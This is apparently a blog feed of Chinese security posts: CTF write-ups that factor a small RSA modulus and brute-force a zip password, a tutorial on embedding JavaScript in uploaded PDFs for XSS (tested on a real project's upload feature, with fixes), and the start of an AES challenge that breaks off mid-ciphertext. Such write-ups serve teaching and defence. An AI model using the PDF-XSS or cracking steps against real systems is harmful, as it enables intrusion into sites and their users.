    <url>/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Crypto%E7%B3%BB%E5%88%97%E4%B9%8BbaigeiRSA/</url>
    <content><![CDATA[<h1 id="【攻防世界】Crypto系列之baigeiRSA"><a href="#【攻防世界】Crypto系列之baigeiRSA" class="headerlink" title="【攻防世界】Crypto系列之baigeiRSA"></a>【攻防世界】Crypto系列之baigeiRSA</h1><p>题目代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">size = <span class="number">128</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = number.getPrime(size) <span class="comment">#产生二进制数</span></span><br><span class="line">q = number.getPrime(size)</span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">m = libnum.s2n(flag) <span class="comment">#将数字转换为字符串</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n = %d&#x27;</span> % n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c = %d&#x27;</span> % c)</span><br><span class="line"></span><br><span class="line"><span class="comment">#n = 88503001447845031603457048661635807319447136634748350130947825183012205093541</span></span><br><span class="line"><span class="comment">#c = 40876621398366534035989065383910105526025410999058860023908252093679681817257</span></span><br></pre></td></tr></table></figure>

<p>分析可得算法为RSA算法，已知数据为n,c,e。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">具体来说，加密过程如下所示：</span><br><span class="line"></span><br><span class="line">选择两个大质数p和q，计算出n=pq，并计算出φ(n)=(p-1)(q-1)。</span><br><span class="line"></span><br><span class="line">选择一个大于1小于φ(n)的整数e，计算出d，使得ed=1 mod φ(n)。</span><br><span class="line"></span><br><span class="line">根据明文M，计算出密文C=Me mod n。</span><br><span class="line">解密过程则可以使用私钥(n, d)来计算出原文M，具体来说：</span><br><span class="line"></span><br><span class="line">输入密文C，以及私钥(n, d)。</span><br><span class="line"></span><br><span class="line">计算出原文M=Cd mod n。</span><br><span class="line"></span><br><span class="line">请注意，由于RSA算法依赖于大质数的分解难度，所以它的安全性并不是十分稳定。目前，对于小规模的RSA密钥，已经有多种针对性的分解方法可以破解RSA密钥，但是对于大规模的RSA密钥，还没有有效的分解方法。所以，如果要使用RSA算法，需要选择更大的密钥来保证安全性。另外，由于RSA算法的计算复杂度较高，它不太适合用于加密大量数据。通常情况下，RSA算法更多的用于数字签名的场景。</span><br></pre></td></tr></table></figure>

<p>这里使用yafu工具对n进行自动因式分解，快速将yafu分解出p,q值，工具运行如下</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Crypto%E7%B3%BB%E5%88%97%E4%B9%8BbaigeiRSA/image-20231031163238346.png" class title="image-20231031163238346">

<p>得到p和q</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">P39 = 274539690398523616505159415195049044439</span><br><span class="line">P39 = 322368694010594584041053487661458382819</span><br></pre></td></tr></table></figure>

<p>接下来计算欧拉函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = <span class="number">274539690398523616505159415195049044439</span></span><br><span class="line">q = <span class="number">322368694010594584041053487661458382819</span></span><br><span class="line"></span><br><span class="line">oula = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(oula)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">88503001447845031603457048661635807318850228250339231930401612280155697666284</span><br></pre></td></tr></table></figure>

<p>然后计算e的逆元</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="built_in">print</span>(inverse(<span class="number">65537</span>,<span class="number">88503001447845031603457048661635807318850228250339231930401612280155697666284</span>))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">7662328611548784798175310040223409230315031128864989272824492242208270573241</span><br></pre></td></tr></table></figure>

<p>注意这里c&#x3D;pow(m,e,n),由RSA解密算法得m&#x3D;pow(c,d,n)可求出m的数字，然后使用libnum.n2s()将数字转换为字符串</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">88503001447845031603457048661635807319447136634748350130947825183012205093541</span></span><br><span class="line">c = <span class="number">40876621398366534035989065383910105526025410999058860023908252093679681817257</span></span><br><span class="line">d = <span class="number">7662328611548784798175310040223409230315031128864989272824492242208270573241</span></span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(m))</span><br></pre></td></tr></table></figure>

<p>得到字符串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;HSCTF&#123;@Zh3n_Ba1_G3i!@&#125;&#x27;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>-CTF -Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>PDF文件上传-XSS</title>
    <url>/2021/11/10/pdf%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-XSS/</url>
    <content><![CDATA[<h1 id="pdf文件上传-XSS"><a href="#pdf文件上传-XSS" class="headerlink" title="pdf文件上传-XSS"></a>pdf文件上传-XSS</h1><hr>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><hr>
<p>pdf是portable document format的缩写，是目前广泛应用于各种场合的文件格式，其是由Adobe公司根据Postscript语言修改后提出的文件标准，并且被ISO组织接受，目前已经发展到2.0版本（ISO32000-2）。目前广泛使用的是1.7版本，该版本pdf功能已经相当丰富，可以显示3D模型，播放多媒体音视频，执行Javascript脚本等功能。</p>
<h2 id="PDF中的JavaScript利用"><a href="#PDF中的JavaScript利用" class="headerlink" title="PDF中的JavaScript利用"></a>PDF中的JavaScript利用</h2><hr>
<p>Pdf文件是应用广泛的一种文件格式，很多针对Adobe阅读器的CVE漏洞都是通过pdf文件中的某些结构触发，触发过程都需要执行事先嵌入在pdf文件中的Javascript脚本。例如CVE-2017-11254 Adobe Acrobat 和Reader中addAnnot Use After Free漏洞，就是通过调用Javascript代码调用addAnnot函数从而触发漏洞；以及CVE-2018-4901 针对pdf中Trailer结构里的ID字段的溢出漏洞，也是需要在文件中通过Javascript调用docID来进行触发。</p>
<p>通过研究发现，目前针对该攻击面的攻击主要分为以下三种方式：</p>
<ul>
<li>通过Javascript调用pdf中的模块进行攻击；</li>
<li>通过Javascript调用阅读器中提供的Javascript相关功能，进行攻击；</li>
<li>其他未知形式的攻击。</li>
</ul>
<h2 id="PDF中的JavaScript规范"><a href="#PDF中的JavaScript规范" class="headerlink" title="PDF中的JavaScript规范"></a>PDF中的JavaScript规范</h2><hr>
<p>在PDF中插入JavaScript的相关介绍信息可以在Javascript_api_reference.pdf中看到[文档下载](<a href="https://opensource.adobe.com/dc-acrobat-sdk-docs/acrobatsdk/pdfs/acrobatsdk_jsapiref.pdf">JavaScript for Acrobat API Reference (adobe.com)</a>)</p>
<p>文档开头函数介绍时，使用四元数组进行函数介绍，如图:</p>
<img src="/2021/11/10/pdf%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-XSS/image-20211115104213416.png" class title="image-20211115104213416">

<p>​            </p>
<img src="/2021/11/10/pdf%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-XSS/image-20211115104316117.png" class title="image-20211115104316117">

<p>我们来看看这四元数组各自所代表的含义:</p>
<ul>
<li>第一列指的是该方法的启用版本以及是否还在使用</li>
<li>第二列指的是该方法引起的变化是否会影响文件</li>
<li>第三列指的是该方法执行需要特殊设置</li>
<li>第四列指的是该方法的可用性</li>
</ul>
<h2 id="PDF中的JavaScript影响范围"><a href="#PDF中的JavaScript影响范围" class="headerlink" title="PDF中的JavaScript影响范围"></a>PDF中的JavaScript影响范围</h2><hr>
<p>Pdf中的Javascript按照影响范围分为以下几种：文件夹级脚本、文档级脚本、页面级脚本、域级脚本以及批处理级脚本。所有类型的脚本都是事件驱动的，即当发生相应事件时，才会响应执行。</p>
<h3 id="文件夹级脚本"><a href="#文件夹级脚本" class="headerlink" title="文件夹级脚本"></a>文件夹级脚本</h3><p>可以影响Acrobat的变量声明和函数定义。一般用于增加菜单或者菜单项等针对Acrobat有影响的函数，包括两种:app和user。此类脚本一般是放到相应文件夹中，一般在Acrobat启动时载入，一般与event实体的应用初始化事件联系。</p>
<h3 id="文档级脚本"><a href="#文档级脚本" class="headerlink" title="文档级脚本"></a>文档级脚本</h3><p>可以影响给定文件的变量声明和函数定义，在文件之外不能应用。可以通过Acrobat创建该级别脚本嵌入pdf文件中。除该类型脚本外，还有文档级动作脚本，其触发动作包括：文件关闭前，文件保存前，文件保存后，文件打印前和文件打印后。</p>
<h3 id="页面级脚本"><a href="#页面级脚本" class="headerlink" title="页面级脚本"></a>页面级脚本</h3><p>该类型脚本在一页打开或关闭时执行。打开事件为当一个页面完成绘制或任何时候查看一个新页的时候。关闭事件为当用户查看的页面不再是当前页时。</p>
<h3 id="域级脚本"><a href="#域级脚本" class="headerlink" title="域级脚本"></a>域级脚本</h3><p>域级脚本与Acrobat中的表格域绑定，当用户与相应区域直接或间接交互时，即触发相应的域事件，该级别脚步存放在pdf文件中。</p>
<h2 id="PDF中的可利用函数"><a href="#PDF中的可利用函数" class="headerlink" title="PDF中的可利用函数"></a>PDF中的可利用函数</h2><hr>
<p>在pdf阅读器支持的所有Javascript函数中以下函数在实际应用中，还是可以对用户的使用造成一些困扰：</p>
<p>app.launchURL()、app.media.getURLdata()、app.alert()、app.execDialog()、doc.getURL。</p>
<h3 id="App-launchURL"><a href="#App-launchURL" class="headerlink" title="App.launchURL()"></a>App.launchURL()</h3><p>该函数在PDF中指定远程链接地址，用于加载远程文件。</p>
<p>该函数的四元组如下；</p>
<img src="/2021/11/10/pdf%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-XSS/image-20211115111527127.png" class title="image-20211115111527127">

<p>该函数包含两个参数，为cURL（用于指定文件的路径）和bNewFrame（用于指定是否用新建页面显示文件）。</p>
<p>当打开包含该函数的pdf文件时，首先会弹出窗口提醒用户建立远程链接，随后使用默认浏览器打开一个远程连接。</p>
<p>使用示例:</p>
<ul>
<li>example  1:</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app.launchURL(&quot;http://www.example.com/&quot;, true)；</span><br></pre></td></tr></table></figure>



<ul>
<li>example 2:</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app.addMenuItem(&#123;</span><br><span class="line">cName: &quot;myHelp&quot;, cUser: &quot;Online myHelp&quot;, </span><br><span class="line">cParent: &quot;Help&quot;, </span><br><span class="line">cExec: &quot;app.launchURL(&#x27;www.example.com/myhelp.html&#x27;);&quot;, </span><br><span class="line">nPos: 0 </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h3 id="App-media-getURLdata"><a href="#App-media-getURLdata" class="headerlink" title="App.media.getURLdata()"></a>App.media.getURLdata()</h3><p>该函数功能指定需要打开的多媒体文件。</p>
<p>该函数的四元组如下；</p>
<img src="/2021/11/10/pdf%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-XSS/image-20211115112442756.png" class title="image-20211115112442756">

<p>该函数包含两个参数，cURL（用于指定文件的路径）和cMimeType（可选，用于指定文件MIME类型）。</p>
<p>使用示例:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var myURLClip = &quot;http://www.example.com/myClip.mpg&quot;;</span><br><span class="line">var args = &#123;</span><br><span class="line">URL: myURLClip,</span><br><span class="line">mimeType: &quot;video/x-mpg&quot;, </span><br><span class="line">doc: this,</span><br><span class="line">settings: &#123;</span><br><span class="line">players: app.media.getPlayers(&quot;video/x-mpg&quot;),</span><br><span class="line">windowType: app.media.windowType.floating,</span><br><span class="line">data: app.media.getURLData(myURLClip,&quot;video/x-mpg&quot;),</span><br><span class="line">floating: &#123; height: 400, width: 600 &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">app.media.openPlayer(args)</span><br></pre></td></tr></table></figure>



<p>当打开包含该函数的pdf文件时，首先会弹出窗口提醒用户建立远程链接，随后根据版本和应用不同可能会有安全提示，随后需要用户手动选择信任，最终使用系统默认的播放器播放URL指定的文件。</p>
<img src="/2021/11/10/pdf%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-XSS/image-20211115112825740.png" class title="image-20211115112825740">



<h3 id="app-alert"><a href="#app-alert" class="headerlink" title="app.alert()"></a>app.alert()</h3><p>该函数哦那你可以弹出一个警示对话框。PDF_XSS主要是alert()函数来执行的.</p>
<p>该函数四元组如下:</p>
<img src="/2021/11/10/pdf%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-XSS/image-20211115113635850.png" class title="image-20211115113635850">



<p>该函数包含多个参数分别为：cMsg（用于指定对话框的内容）、nIcon（可选，用于指定对话框图标）、nType（可选，用于指定按钮的类型）、cTitle（可选，用于指定对话框标题）、oDoc（可选，指定与警告相关的Doc结构）、oCheckbox（可选，在对话框中放一个checkbox并且可以指定相关内容、初始值以及结束值）</p>
<p>使用示例:</p>
<ul>
<li>example1</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Display a simple alert box:</span><br><span class="line"></span><br><span class="line">app.alert(&#123;</span><br><span class="line">cMsg: &quot;Error! Try again!&quot;, </span><br><span class="line">cTitle: &quot;Acme Testing Service&quot;&#125;);</span><br></pre></td></tr></table></figure>

<ul>
<li>example 2</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Close the document with the user’s permission:</span><br><span class="line">// A MouseUp action</span><br><span class="line"></span><br><span class="line">var nButton = app.alert(&#123; </span><br><span class="line">cMsg: &quot;Do you want to close this document?&quot;,</span><br><span class="line">cTitle: &quot;A message from A. C. Robat&quot;, </span><br><span class="line">nIcon: 2, nType: 2 </span><br><span class="line">&#125;);</span><br><span class="line">if ( nButton == 4 ) this.closeDoc()</span><br></pre></td></tr></table></figure>

<ul>
<li>example 3</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">One document creates an alert box in another document. There are two documents, DocA and DocB, one open in a browser and the other in the viewer.</span><br><span class="line">// The following is a declaration at the document level in DocA</span><br><span class="line"></span><br><span class="line">var myAlertBoxes = new Object;</span><br><span class="line">myAlertBoxes.oMyCheckbox = &#123;</span><br><span class="line">cMsg: &quot;Care to see this message again?&quot;,</span><br><span class="line">bAfterValue: false</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//The following is a mouse-up action in DocA. The variable theOtherDoc is the Doc object of DocB. The alert box asks if the user wants to see this alert box again. If the user clicks the check box, the alert does not appear again.</span><br><span class="line"></span><br><span class="line">if ( !myAlertBoxes.oMyCheckbox.bAfterValue )</span><br><span class="line">&#123;</span><br><span class="line">app.alert(&#123;</span><br><span class="line">cMsg: &quot;This is a message from the DocA?&quot;,</span><br><span class="line">cTitle: &quot;A message from A. C. Robat&quot;,</span><br><span class="line">oDoc:theOtherDoc, </span><br><span class="line">oCheckbox: myAlertBoxes.oMyCheckbox</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="app-execDialog"><a href="#app-execDialog" class="headerlink" title="app.execDialog()"></a>app.execDialog()</h3><p>该函数功能创建一个对话框，可以自定义高度定制化对话框。</p>
<p>该函数四元组如下；</p>
<img src="/2021/11/10/pdf%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-XSS/image-20211115114201673.png" class title="image-20211115114201673">



<h3 id="doc-getURL"><a href="#doc-getURL" class="headerlink" title="doc.getURL()"></a>doc.getURL()</h3><p>该函数为通过GET方法获取RL指向文件。</p>
<p>该函数四元组如下；</p>
<img src="/2021/11/10/pdf%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-XSS/image-20211115114600384.png" class title="image-20211115114600384">

<p>该函数包含两个参数，分别为cURL（目标文件的地址）和bAppend（如果为true，将运行结果附加到当前文件；当文件在浏览器中运行时，推荐使用false）。</p>
<p>使用示例；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">this.getURL(&quot;http://www.example.com/&quot;, false);</span><br></pre></td></tr></table></figure>



<p>当该函数运行后，仍然会有安全性提示，如下：</p>
<img src="/2021/11/10/pdf%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-XSS/image-20211115114650402.png" class title="image-20211115114650402">



<p>然而该函数还有另外一个功能是可以运行本地文件，同时为了防止执行任意文件，还在注册表项中\LOCAL_MACHINE\SOFTWARE\Policies\Adobe\Acrobat Reader\11.0\FeatureLoc kDown\ cDef aultLaunchAttachmentPerms进行了限制。当用户尝试执行文件不在限制范围内时，还会调用系统函数SaferiIsExecutableFileType判断是否为可执行文件，同时不受两方面限制后将会出现以下两个弹窗进行提示：</p>
<img src="/2021/11/10/pdf%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-XSS/image-20211115115051252.png" class title="image-20211115115051252">



<p>最终打开目标文件；</p>
<img src="/2021/11/10/pdf%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-XSS/image-20211115115132171.png" class title="image-20211115115132171">



<h2 id="PDF-XSS"><a href="#PDF-XSS" class="headerlink" title="PDF_XSS"></a>PDF_XSS</h2><hr>
<p>这里使用app.alert()函数在PDF中插入代码来测试xss，当然其他的攻击也可以利用上面的函数进行利用。这里使用的是迅捷PDF编辑器进行PDF的XSS测试。</p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>首先在编辑器中新建文党，如下；</p>
<img src="/2021/11/10/pdf%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-XSS/image-20211115115924780.png" class title="image-20211115115924780">



<p>右键文档缩略图，点击文档的属性设置，可以在右边看到页面设置。</p>
<img src="/2021/11/10/pdf%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-XSS/image-20211115120103631.png" class title="image-20211115120103631">



<p>点击动作，可以选择打开和关闭页面的动作设置。进去点击新增按钮，运行JavaScript。</p>
<img src="/2021/11/10/pdf%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-XSS/image-20211115120220718.png" class title="image-20211115120220718">



<p>边界js动作为alert弹窗</p>
<img src="/2021/11/10/pdf%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-XSS/image-20211115120452458.png" class title="image-20211115120452458">



<p>可以看到在浏览器在线访问时，弹窗成功，js代码执行成功。</p>
<img src="/2021/11/10/pdf%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-XSS/image-20211115120626777.png" class title="image-20211115120626777">

<p>经测试，在360浏览器，Google浏览器和Edge浏览器上访问PDF文件，js代码会被执行。</p>
<p><strong>注:</strong></p>
<p><strong>Adobe 支持自身的 JavaScript 对象模型，例如 alert(‘xss’)必须被 APP 对象调用，因此变成了 app.alert(‘xss’)。这意味着，利用 JavaScript 进行攻击时只能使用 Adobe 所支持的功能。</strong></p>
<h3 id="项目实战"><a href="#项目实战" class="headerlink" title="项目实战"></a>项目实战</h3><p>在项目功能点发现上传文件选项<img src="/2021/11/10/pdf%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-XSS/image-20211115134208035.png" class title="image-20211115134208035"></p>
<p>构造插入恶意JS语句的PDF文件进行上传，</p>
<img src="/2021/11/10/pdf%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-XSS/image-20211115135140939.png" class title="image-20211115135140939">



<p>在Google浏览器上访问上传的PDF文件，JS语句执行，弹窗成功</p>
<img src="/2021/11/10/pdf%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-XSS/image-20211115135213863.png" class title="image-20211115135213863">



<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>1.作为网站管理员或开发者，可以选择强迫浏览器下载 PDF 文件，而不是提供在线浏览等，或修改 Web 服务器配置的 header 和相关属性</p>
<p>2.使用第三方插件解析pdf，不用chrome自带的pdf解析就行，<a href="https://github.com/adobe-type-tools/cmap-resources">https://github.com/adobe-type-tools/cmap-resources</a></p>
]]></content>
      <categories>
        <category>Web漏洞</category>
        <category>文件上传</category>
      </categories>
      <tags>
        <tag>-web漏洞 -XSS -PDF漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>【攻防世界】Crypto系列之你猜猜</title>
    <url>/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Crypto%E7%B3%BB%E5%88%97%E4%B9%8B%E4%BD%A0%E7%8C%9C%E7%8C%9C/</url>
    <content><![CDATA[<h1 id="【攻防世界】Crypto系列之你猜猜"><a href="#【攻防世界】Crypto系列之你猜猜" class="headerlink" title="【攻防世界】Crypto系列之你猜猜"></a>【攻防世界】Crypto系列之你猜猜</h1><p>打开txt文件是一段十六进制数字，推测可能是将flag转换为十六进制或者是flag文件的程序字节码，直接将十六进制转换为字符串是行不通的，所以只能猜测是文件的程序字节码，那么是什么类型的文件的呢？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">504B03040A0001080000626D0A49F4B5091F1E0000001200000008000000666C61672E7478746C9F170D35D0A45826A03E161FB96870EDDFC7C89A11862F9199B4CD78E7504B01023F000A0001080000626D0A49F4B5091F1E00000012000000080024000000000000002000000000000000666C61672E7478740A0020000000000001001800AF150210CAF2D1015CAEAA05CAF2D1015CAEAA05CAF2D101504B050600000000010001005A000000440000000000</span><br></pre></td></tr></table></figure>

<p>网上搜索一下，zip就从504B0304开始识别，从504B0506结束。把文件命名成什么文件类型，计算机就从什么特征头来进行识别，text不存在任何文件头；526172211a0701开头代表rar数据，377abcaf271c开头代表7z数据。</p>
<p>将十六进制保存为zip文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">hex_num = <span class="number">0x504B03040A0001080000626D0A49F4B5091F1E0000001200000008000000666C61672E7478746C9F170D35D0A45826A03E161FB96870EDDFC7C89A11862F9199B4CD78E7504B01023F000A0001080000626D0A49F4B5091F1E00000012000000080024000000000000002000000000000000666C61672E7478740A0020000000000001001800AF150210CAF2D1015CAEAA05CAF2D1015CAEAA05CAF2D101504B050600000000010001005A000000440000000000</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;nicaicai.zip&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(long_to_bytes(hex_num))</span><br></pre></td></tr></table></figure>

<p>打开zip压缩包，可以看到flag.txt是加密了的</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Crypto%E7%B3%BB%E5%88%97%E4%B9%8B%E4%BD%A0%E7%8C%9C%E7%8C%9C/image-20231128095430502.png" class title="image-20231128095430502">



<p>使用压缩包解密软件对其进行破解,其实就是一个暴力破解的过程</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Crypto%E7%B3%BB%E5%88%97%E4%B9%8B%E4%BD%A0%E7%8C%9C%E7%8C%9C/image-20231128101110793.png" class title="image-20231128101110793">



<p>这里使用首先对zip文件获取信息</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Crypto%E7%B3%BB%E5%88%97%E4%B9%8B%E4%BD%A0%E7%8C%9C%E7%8C%9C/image-20231128100240405.png" class title="image-20231128100240405">

<p>然后使用fcrackzip工具破解密码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fcrackzip nicaicai,zip</span><br></pre></td></tr></table></figure>

<p>得到密码123456</p>
<p>对压缩包输入密码获取flag.txt里的字符</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Crypto%E7%B3%BB%E5%88%97%E4%B9%8B%E4%BD%A0%E7%8C%9C%E7%8C%9C/image-20231128100706155.png" class title="image-20231128100706155">

<p>flag为<strong>daczcasdqwdcsdzasd</strong></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>-CTF -Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>【攻防世界】Crypto系列之了不起的盖茨比</title>
    <url>/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Crypto%E7%B3%BB%E5%88%97%E4%B9%8B%E4%BA%86%E4%B8%8D%E8%B5%B7%E7%9A%84%E7%9B%96%E8%8C%A8%E6%AF%94/</url>
    <content><![CDATA[<h1 id="【攻防世界】Crypto系列之了不起的盖茨比"><a href="#【攻防世界】Crypto系列之了不起的盖茨比" class="headerlink" title="【攻防世界】Crypto系列之了不起的盖茨比"></a>【攻防世界】Crypto系列之了不起的盖茨比</h1><p>题目源代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor <span class="keyword">as</span> xor</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> copy <span class="keyword">import</span> copy</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> data</span><br><span class="line"></span><br><span class="line">iv=<span class="built_in">bytes</span>([randint(<span class="number">0</span>,<span class="number">2</span>**<span class="number">8</span>-<span class="number">1</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)])</span><br><span class="line"><span class="built_in">print</span>(iv)</span><br><span class="line">iva=copy(iv)</span><br><span class="line">key=<span class="built_in">bytes</span>([randint(<span class="number">0</span>,<span class="number">2</span>**<span class="number">8</span>-<span class="number">1</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)])</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line">cipher=AES.new(key,mode=AES.MODE_ECB)</span><br><span class="line">data=pad(data,<span class="number">16</span>)</span><br><span class="line">c=<span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(data),<span class="number">16</span>):</span><br><span class="line">    s=data[i:i+<span class="number">16</span>].ljust(<span class="number">16</span>,<span class="string">b&quot;\n&quot;</span>)<span class="comment">#后面填充16个字符的&quot;\n&quot;换行符</span></span><br><span class="line">    c+=cipher.encrypt(xor(s,iv))</span><br><span class="line">    iv=xor(s,c[-<span class="number">16</span>:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key=b64encode(key)</span><br><span class="line">c=b64encode(c)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">b&#x27;+0zkhmid1PFjVdxSP09zSw==&#x27;</span></span><br><span class="line"><span class="string">b&#x27;A0bzFxdM95YoXm64g0gZkiTloPsBAq7iV56t1M7Q4zVNxRJSTdZH0lzOMa7QyIQbKN/ftm01iZgQAk+JVgCB6hlCdMPWkdpKYHix8BTq/ClEHUPwMEjUEvgKD4tH3T/thoccBw1jfJ9RjhXbMFByWn5cyA/gHVvEEJRpII/ryKMQkzelioQ5b0MfhSy4INLqQk6yAgLzihip5ho7lDJCbYcaz85bDksOo5n9kjOfjFnjUn9G7jX+AtyhygPlGfrvauTeuPdVxqrJTVHvrzUNAqiqtCElX+BWpicP2mkZLt5B/gpquTv8U+StrdTOcr7UkWuz+YdhXkTJYUZguv7EbEnRy+M64QzqfnNf8Zk0tJQ5xOumbY8hxGTuZ8w3rWxjPKLhdgTGLgMcMYF3hPb2eqG9VZKC3T9zElI5MWPyIdkmqkrLEt6vGT8AxWJy1hl2ApkGhrJFB0DobJircN6kXUXvZXitjXSH+BA48muaRlAwK13re+zIcbI+B7+Tm3LuRT9j5NWD9RBoy+IeAQvR05IKWqEpqXEScmZsQxpAFZCSnbchYaYNAuHvBwMcMW7vTMyxROHRtyZ+gWNUhpd8CcZ9FA6w+cwQLMWW5D4nUCMK+NEsSyTBBm/jTiAp/waq+2dTVyBhbQtmm9pBtZtHJtfeVRKuZRXduNnlWDa7Wlwv0Jk2EIJpAaXxosuZnO0PHW3oX+WO5F9ydIfIJAFUpBrn4fMx3c7IJ08+bKwAfBw/johSs1ieyX/YjOOL1KbE9J6Hz3ZBBR4waQ4p9sdLsJ9UFnNghH0ZuB2F7bGoH7SurvaMglo3FyQAfM+n/EVCGWnax/JGEcw5YZuS2c7y5Gd4oOCmpFO/lVj0IaOlZsFsMgQ3GUsBT2h1y